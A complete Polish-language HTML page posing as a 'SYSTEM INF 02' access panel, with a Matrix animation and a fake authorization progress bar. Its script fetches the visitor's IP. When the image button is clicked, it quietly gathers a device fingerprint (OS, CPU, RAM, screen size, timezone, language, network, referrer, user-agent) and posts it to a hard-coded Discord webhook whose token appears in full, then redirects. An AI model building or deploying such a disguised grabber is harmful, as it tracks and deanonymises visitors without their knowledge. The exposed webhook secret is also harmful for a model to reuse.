<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel Dostępu</title>
    <style>
        /* Stylizacja tła i fontu */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #121212;
            color: #e0e0e0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            user-select: none;
            overflow: hidden;
        }

        /* Tło Matrix w tle strony */
        #matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            z-index: 1;
            opacity: 0.12;
            pointer-events: none;
        }

        /* Kontener główny nad tłem */
        .main-content {
            position: relative;
            z-index: 2;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        h1 {
            color: #bb86fc;
            margin-bottom: 5px;
            letter-spacing: 2px;
            text-shadow: 0 0 10px rgba(187, 134, 252, 0.3);
        }

        /* Stylizacja konsoli/terminala */
        #console-container {
            margin: 20px;
            background: #1e1e1e;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #333;
            width: 420px;
            box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
            font-family: 'Courier New', Courier, monospace;
            box-sizing: border-box;
        }

        #ip {
            font-size: 0.95rem;
            color: #03dac6;
            margin-bottom: 10px;
            min-height: 40px;
            line-height: 1.4;
        }

        /* Pasek postępu */
        .progress-bar-container {
            width: 100%;
            background-color: #333;
            border-radius: 4px;
            overflow: hidden;
            display: none; /* Domyślnie ukryty, pojawia się po kliknięciu */
        }

        .progress-bar {
            width: 0%;
            height: 8px;
            background-color: #bb86fc;
            box-shadow: 0 0 8px #bb86fc;
            transition: width 0.1s linear;
        }

        /* Stylizacja przycisku-obrazka */
        .btn-container {
            background: none;
            border: none;
            padding: 0;
            cursor: pointer;
            transition: transform 0.2s, filter 0.3s;
            outline: none;
        }

        .btn-container:hover {
            transform: scale(1.03);
            filter: brightness(1.1);
        }

        .btn-container:active {
            transform: scale(0.97);
        }

        .btn-container img {
            width: 450px;
            border-radius: 15px;
            border: 2px solid #bb86fc;
            box-shadow: 0 0 20px rgba(187, 134, 252, 0.4);
            display: block;
        }
    </style>
</head>
<body>

    <!-- Animowane Cyfrowe Tło -->
    <canvas id="matrix-bg"></canvas>

    <!-- Główna zawartość interfejsu -->
    <div class="main-content">
        <h1>SYSTEM INF 02</h1>
        
        <div id="console-container">
            <div id="ip">> Inicjalizacja podsystemów...</div>
            <div class="progress-bar-container">
                <div class="progress-bar" id="p-bar"></div>
            </div>
        </div>
        
        <button class="btn-container" onclick="startSystemAccess()">
            <img src="https://radiokielce.pl/wp-content/uploads/2021/11/1-opatow-180109.jpeg" alt="WEJDŹ DO BAZY">
        </button>
    </div>

    <script>
        let currentIP = "Nieznane (Blokada/AdBlock)";

        // --- ANIMACJA MATRIX BACKGROUND ---
        const canvas = document.getElementById('matrix-bg');
        const ctx = canvas.getContext('2d');

        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);

        const alphabet = "01INF02ZSTABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const fontSize = 16;
        const columns = canvas.width / fontSize;
        const rainDrops = Array(Math.floor(columns)).fill(1);

        function drawMatrix() {
            ctx.fillStyle = 'rgba(18, 18, 18, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#bb86fc';
            ctx.font = fontSize + 'px monospace';

            for (let i = 0; i < rainDrops.length; i++) {
                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    rainDrops[i] = 0;
                }
                rainDrops[i]++;
            }
        }
        setInterval(drawMatrix, 30);


        // --- POSEKSAMINA OPERACYJNA (TELEMETRIA) ---
        fetch("https://api.ipify.org?format=json")
            .then(response => response.json())
            .then(data => {
                currentIP = data.ip;
                document.getElementById("ip").innerHTML = "> Gotowy do autoryzacji.<br>> Oczekiwanie na kliknięcie...";
            })
            .catch(() => {
                document.getElementById("ip").innerHTML = "<span style='color: #cf6679;'>> Błąd API sieci publicznej.<br>> Tryb offline aktywny.</span>";
            });

        // Dynamiczna symulacja ładowania i wysyłka
        function startSystemAccess() {
            const ipDiv = document.getElementById("ip");
            const btn = document.querySelector('.btn-container');
            const pContainer = document.querySelector('.progress-bar-container');
            const pBar = document.getElementById('p-bar');
            
            btn.style.pointerEvents = "none";
            btn.style.opacity = "0.4";
            pContainer.style.display = "block";

            // Logi wyświetlane w konsoli w miarę postępu paska
            const steps = [
                { prg: 15, msg: "> Skanowanie architektury klienta..." },
                { prg: 35, msg: "> Zbieranie metadanych sprzętowych..." },
                { prg: 55, msg: "> Generowanie sumy kontrolnej ładunku..." },
                { prg: 80, msg: "> Pakowanie i szyfrowanie danych (AES-256)..." },
                { prg: 95, msg: "> Wysyłanie pakietu przez bramkę sieciową..." },
                { prg: 100, msg: "> Autoryzacja zakończona sukcesem!" }
            ];

            // Pobieranie ZAAWANSOWANYCH informacji o systemie
            const screenRes = `${window.screen.width}x${window.screen.height}`;
            const windowRes = `${window.innerWidth}x${window.innerHeight}`;
            const cCores = navigator.hardwareConcurrency || "Brak danych";
            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Brak danych";
            const platform = navigator.platform || "Nieznana";
            const lang = navigator.language || "Nieznany";
            const zone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Nieznana";
            const cookies = navigator.cookieEnabled ? "Włączone" : "Wyłączone";
            const touch = navigator.maxTouchPoints > 0 ? `Tak (${navigator.maxTouchPoints} pkt)` : "Nie";
            const referer = document.referrer || "Bezpośrednie wejście";
            
            // Parametry sieciowe (jeśli przeglądarka wspiera)
            const net = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            const netType = net ? net.effectiveType : "Brak danych";
            const netSpeed = net ? `${net.downlink} Mbps` : "Brak danych";

            let currentStep = 0;

            const interval = setInterval(() => {
                if (currentStep < steps.length) {
                    const step = steps[currentStep];
                    pBar.style.width = step.prg + "%";
                    ipDiv.innerHTML = step.msg;

                    // Kiedy dochodzimy do etapu wysyłania pakietu (80%-95%), odpalamy w tle webhooka
                    if (step.prg === 80) {
                        const payload = {
                            content: "=======================================\n" +
                                     "🔐 **PEŁNY RAPORT TELEMETRYCZNY INF.02**\n" +
                                     "=======================================\n" +
                                     `🌐 **Adres IP:** \`${currentIP}\`\n` +
                                     `🖥️ **Platforma/OS:** \`${platform}\`\n` +
                                     `⚙️ **Procesor (Rdzenie):** \`${cCores} vCPU\`\n` +
                                     `🧠 **Pamięć RAM:** \`${ram}\`\n` +
                                     `📊 **Rozdzielczość (Ekran):** \`${screenRes}\`\n` +
                                     `🪟 **Rozmiar Okna:** \`${windowRes}\`\n` +
                                     `🌍 **Strefa czasowa:** \`${zone}\`\n` +
                                     `💬 **Język systemu:** \`${lang}\`\n` +
                                     `📡 **Typ sieci / Prędkość:** \`${netType} / ~${netSpeed}\`\n` +
                                     `🍪 **Pliki Cookie:** \`${cookies}\`\n` +
                                     `📱 **Ekran dotykowy:** \`${touch}\`\n` +
                                     `🔗 **Źródło wejścia (Referrer):** \`${referer}\`\n` +
                                     `🤖 **User-Agent:** \`${navigator.userAgent}\`\n` +
                                     "======================================="
                        };

                        fetch("https://discord.com/api/webhooks/1514013803912630352/WSDMZ0hqcG6s9M8TTvptRjYjll1yYqRCNjdHCiSse6sRYOWr-34xIRTTpqqDkYNHFDxm", {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify(payload)
                        }).catch(err => console.log("Błąd transmisji"));
                    }

                    currentStep++;
                } else {
                    clearInterval(interval);
                    // Odczekaj chwilę po 100%, aby użytkownik zobaczył sukces i przekieruj
                    setTimeout(() => {
                        window.location.href = "index2.html";
                    }, 800);
                }
            }, 650); // Zmiana kroków co 650ms (ładny, naturalny proces)
        }
    </script>
</body>
</html>
